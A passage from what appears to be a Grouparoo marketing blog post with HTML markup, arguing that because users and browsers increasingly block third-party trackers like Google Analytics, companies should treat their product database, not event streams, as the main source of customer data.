is leading to more and more consumers blocking tools like Segment, Mixpanel, Amplitude, and Google Analytics from getting any events at all. In fact, <a href="https://www.theverge.com/2020/3/24/21192830/apple-safari-intelligent-tracking-privacy-full-third-party-cookie-blocking">major browsers are now shipping with defaults to prevent third-party tracking and cookies</a>. Rather than fight the modern privacy-conscious consumer because your marketing stack relies on events, embrace the choices they are making. Utilize your source-of-truth of their behavior and preferences you already have, your product database.</p><h2>Grouparoo’s Open-Source Promise</h2><p>There’s still a place for events in your marketing stack, but they shouldn’t be the primary source of any piece of customer data.
